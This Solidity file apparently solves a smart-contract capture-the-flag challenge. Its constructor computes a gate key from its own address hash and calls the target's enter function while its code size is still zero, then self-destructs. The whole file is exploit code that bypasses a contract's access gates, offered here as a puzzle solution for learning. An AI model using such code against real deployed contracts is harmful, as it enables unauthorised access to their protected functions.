pragma solidity ^0.6.0;

contract Crack {

    constructor(address _target) public {
        bytes8 gateKey = bytes8(uint64(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ uint64(0) - 1));
        (bool success, bytes memory _) = address(_target).call(
            abi.encodeWithSignature("enter(bytes8)", gateKey)
        );
        require(success);
        selfdestruct(msg.sender);
    }

}